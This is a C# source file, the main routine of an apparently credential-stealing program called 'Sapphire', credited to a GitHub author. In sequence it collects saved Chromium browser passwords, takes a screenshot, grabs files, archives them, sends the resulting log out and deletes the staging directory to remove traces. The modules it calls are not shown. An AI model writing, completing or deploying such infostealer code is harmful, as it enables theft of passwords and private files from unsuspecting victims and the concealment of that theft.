// by r3vengerx0
// github.com/r3vengerx0

using System;
using System.Collections.Generic;
using Sapphire.Modules.Passwords.Chromium;
using Sapphire.Modules.Information;
using Sapphire.Modules.Grabbers;
using Sapphire.Modules.Helpers;

namespace Sapphire
{
    class Program
    {
        static void Main(string[] args) 
        {
            Chromium.Get();
            Screenshot.Make();
            Files.Grab();
            FileManager.ArchiveDirectory();

            SendLog.Send();

            FileManager.DeleteDirectory("all");
        }
    }
}
